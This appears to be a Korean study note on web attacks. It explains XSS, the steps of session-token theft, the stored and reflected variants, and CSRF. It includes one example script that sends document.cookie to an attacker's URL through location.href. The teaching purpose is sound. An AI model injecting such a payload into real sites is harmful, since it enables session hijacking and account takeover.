크로스사이트 스크립트(Cross Site Script)
CSS(Cascading Style Sheet)와 구별짓기 위해 축약할때 XSS라고 한다.

XSS 공격은 화면의 출력을 담당하고 있는 웹 애플리케이션의 입력값에 자바스크립트와 같은 스크립트를 삽입하여 사용자 측에서 비정상적인 조작이 일어나도록 유도하는 것이다.
이는 웹 취약점이 존재하는 웹 애플리케이션 서버를 공격하는 것이 아니라 이를 사용하는 사용자를 공격대상으로 하고 있다는 것이 다른 공겨과 구별되는 특징 중의 하나이다.

과거에는 사용자의 Session ID나 Cookie 값을 훔쳐내어 권한을 얻는 기법이 사용되었지만,
최근에는 랜섬웨어와 같은 악성코드 배포에도 이용되고 있다.
취약점이 발생하는 페이지는 특정할 수는 없지만, 에러 메세지 출력이나 사용자에게 정보를 입력받는 페이지 등에서 주로 발생한다.

1) 공격자가 XSS 취약점이 존재하는 서버에 악성 스크립트를 게시
2) 관리자 또는 사용자가 로그인하고 토큰(Cookie or Session ID) 생성
3) 공격자가 게시한 악성 스크립트를 보거나 클릭
4) 관리자 또는 사용자의 토큰이 공격자에게 전송
5) 공격자가 해당 토큰을 이용하여 다른 사용자의 권한을 획득

일반적으로 이와 같은 공격은 다음과 같은 조건을 만족해야 한다.
이중 한가지만 만족해도 XSS 공격은 성립될 수 있다.

-클라이언트측 언어 실행
HTML 태그의 사용이 허락되어 있어 javascript 또는 VB script와 같이 클라이언트에서 실행 가능한 언어를 사용할 수 있어야 한다.

-동적 콘텐츠 업로드 가능
Flash와 같은 동적 콘텐츠를 올릴 수 있고, 이를 URL을 통해 접근하거나 호출할 수 있다면 손쉽게 인증 토큰을 획득할 수 있다.

-동적 콘텐츠 관련 태그 지원
HTML 태그를 이용하여 동적 콘텐츠를 호출할 수 있고 웹 애플리케이션에 입력값을 검정하지 않은 인자가 존재할 경우, 이를 악용하여 클라이언트측의 인증 토큰을 획득할 수 있다.

ex)
<script>
	location.href='http://www............?token='+document.cookie';
</script>

location.href은 현재 웹 브라우저를 다른곳으로 이동시키는 것으로 예제에서는 공격자의 사이트로 쿠키값을 전송하고 있다.

공격자는 전송되어온 토큰값을 수집하고 사용자의 화면을 다른 사이트로 이동시킨다.
또 다른페이지에서 지켜보고 있다가 웹 프록시를 이용해 해당 토큰 값을 자신의 웹 브라우저에 할당할 수 있다.




Stored XSS
데이터베이스에 저장하는 악성 스크립트

데이터베이스에 저장하지 못하도록 막아도 이전에 있던 XSS는 막지 못한다.
따로 관리 필요


Reflected XSS
공격대사 서버 데이터베이스에 스크립트를 저장하지 않는 특징이 있다.

Cross Site Request Forgery (CSRF)
악성 스크립트를 입력폼에 삽입해서 저장하는 Stored XSS 공격과 비슷한 점이 있다.
하지만, CSRF는 사용자가 마우스 클릭 같은 정상적인 행위를 했을 때 자신도 모르게 악성 게시물 작성, 계좌 자동 이제 등과 같이 공격자가 의도하는 상황에서 발생한다.
예로 CSRF 방식으로 계좌 자동 이체 공격을 한다면, 메세지에 악성 스크립트를 입력하고, 요청버튼을 클릭해서 저장한다.
그리고 다른 사용자가 이 메세지를 읽을 때 저장된 악성 스크립트가 실행되어 자동으로 계좌 이체가 이뤄지게 한다.
